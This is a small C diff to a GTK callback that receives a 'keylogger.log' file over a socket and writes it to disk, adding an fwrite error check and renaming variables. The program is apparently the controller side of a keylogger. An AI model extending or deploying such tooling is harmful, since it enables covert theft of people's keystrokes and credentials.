@@ -213,7 +213,6 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     FILE *log_file = NULL;
     FILE *final_log_file = NULL;
     size_t flag_log = 6;
-    int log_empty = -1;
 
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
@@ -223,6 +222,11 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     char caractere = 0;
     size_t i = 0;
     gboolean bInconsistent;
+    
+    GtkWidget *log_empty = NULL;
+    int log_is_empty = -1;
+    
+    
     
     log_file = fopen("keylogger.log", "w");
     if(log_file == NULL)
@@ -266,7 +270,7 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     }
     
     printf("\nRecive weight of the file : %ld\n", data_len);
-
+    
     do
     {
         tailleBlockRecut = recv(sock, buffer, data_len, 0);
@@ -276,8 +280,12 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
             return;
         }
 
-        fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, log_file);
-
+        if(fwrite(buffer, sizeof(char), (size_t)tailleBlockRecut, log_file) == 0)
+        {
+            error("fwrite() buffer", "cb_download_log_file()");
+            return;
+            
+        }
         totalRcv += tailleBlockRecut;
 
     }while(totalRcv < data_len);
